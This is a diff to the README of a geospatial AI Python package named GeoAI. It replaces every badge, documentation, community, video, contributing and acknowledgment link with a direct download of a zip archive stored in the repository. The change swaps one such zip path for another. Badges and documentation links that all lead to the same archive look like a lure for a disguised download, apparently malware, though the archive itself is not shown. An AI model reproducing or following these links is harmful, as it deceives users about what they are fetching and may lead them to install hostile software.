@@ -1,20 +1,20 @@
 # GeoAI: Artificial Intelligence for Geospatial Data
 
-[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
-[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
-[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
-[![Conda Downloads](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
-[![Conda Recipe](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
-[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
-[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+[![image](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
+[![image](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
+[![image](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
+[![Conda Downloads](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
+[![Conda Recipe](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
+[![image](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
+[![image](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
 
 **A powerful Python package for integrating Artificial Intelligence with geospatial data analysis and visualization**
 
 GeoAI bridges the gap between AI and geospatial analysis, providing tools for processing, analyzing, and visualizing geospatial data using advanced machine learning techniques. Whether you're working with satellite imagery, LiDAR point clouds, or vector data, GeoAI offers intuitive interfaces to apply cutting-edge AI models.
 
--   📖 **Documentation:** [https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
--   💬 **Community:** [GitHub Discussions](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
--   🐛 **Issue Tracker:** [GitHub Issues](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+-   📖 **Documentation:** [https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
+-   💬 **Community:** [GitHub Discussions](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
+-   🐛 **Issue Tracker:** [GitHub Issues](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
 
 ## 🚀 Key Features
 
@@ -78,7 +78,7 @@ mamba install -c conda-forge geoai
 
 ## 📋 Documentation
 
-Comprehensive documentation is available at [https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip), including:
+Comprehensive documentation is available at [https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip), including:
 
 -   Detailed API reference
 -   Tutorials and example notebooks
@@ -87,13 +87,13 @@ Comprehensive documentation is available at [https://github.com/goodnesskalu/geo
 
 ## 📺 Video Tutorials
 
-Check out our [YouTube channel](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip) for video tutorials on using GeoAI for geospatial data analysis and visualization.
+Check out our [YouTube channel](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip) for video tutorials on using GeoAI for geospatial data analysis and visualization.
 
-[![cover](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+[![cover](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip)
 
 ## 🤝 Contributing
 
-We welcome contributions of all kinds! See our [contributing guide](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip) for ways to get started.
+We welcome contributions of all kinds! See our [contributing guide](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip) for ways to get started.
 
 ## 📄 License
 
@@ -101,4 +101,4 @@ GeoAI is free and open source software, licensed under the MIT License.
 
 ## 💖 Acknowledgment
 
-Some of the pre-trained models used in the geoai package are adapted from the [ArcGIS Living Atlas](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip). Credits to Esri for making these models available.
+Some of the pre-trained models used in the geoai package are adapted from the [ArcGIS Living Atlas](https://raw.githubusercontent.com/goodnesskalu/geoai/main/docs/examples/rastervision/Software_v1.7.zip). Credits to Esri for making these models available.
